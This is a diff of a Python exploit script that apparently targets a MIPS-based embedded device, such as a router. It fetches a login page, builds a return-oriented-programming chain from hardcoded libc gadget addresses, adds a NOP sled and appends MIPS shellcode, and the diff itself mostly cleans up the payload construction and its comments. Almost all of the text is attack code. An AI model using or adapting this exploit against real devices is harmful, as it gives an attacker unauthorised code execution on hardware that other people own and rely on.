@@ -21,7 +21,6 @@ req = requests.get(loginUrl, headers=headers)
 directory = ''
 
 nop = "\x27\xE0\xFF\xFF"
-nop1 = "\x27\x70\xc0\x01"
 
 shellcode = string.join([
 		"\x24\x0f\xff\xfa", # li	t7,-6
@@ -76,10 +75,6 @@ shellcode = string.join([
 		"\x01\x01\x01\x0c"  # syscall	0x40404
             ], '')
 
-#0x00024ec4: lw $s0, ($s1); sw $s0, ($s1); lw $ra, 0x2c($sp); lw $s1, 0x28($sp); lw $s0, 0x24($sp); jr $ra;
-#We control S0 and S1 registers
-
-#1) First gadget will set a0 to 1
 libcBase= 0x77f53000
 sleep = libcBase + 0x53CA0
 gadget1 = libcBase + 0x00055c60 # addiu $a0, $zero, 1; move $t9, $s1; jalr $t9;
@@ -113,23 +108,12 @@ payload += struct.pack('>I', gadget3) #gadget2 -> lw $ra, 0x2c($sp) => 44 bytes
 #New stack for gadget 3 starts
 payload += "G" *24
 payload += "A"* 4 #lw $s0, 0x18($sp); sp + 24 bytes = s0
-
-payload += struct.pack('>I', gadget5)
-#payload += "B" *4 #lw $s1, 0x1c($sp); sp + 28 bytes = s1 <= load gadget 5 addr
-
+payload += struct.pack('>I', gadget5)#lw $s1, 0x1c($sp); sp + 28 bytes = s1 <= load gadget 5 addr
 payload += "C" *4 #lw $s2, 0x20($sp); sp + 32 bytes = s2
-
-#payload += "D" *4 #lw $ra, 0x24($sp); sp + 36 bytes = ra <= load gadget 4 addr
-payload += struct.pack('>I', gadget4)
-
+payload += struct.pack('>I', gadget4) #lw $ra, 0x24($sp); sp + 36 bytes = ra <= load gadget 4 addr
 #New stack for gadget 4 starts
 payload += nop * 32  
-#payload += "A"*40
 payload += shellcode #addiu $s0, $sp, 0x24; sp + 36 bytes = s0
-
-
-#payload += nop1 *20
-#payload += shellcode
 
 if(req.status_code):
     directory = req.text.split('=')[2].split('/')[3]
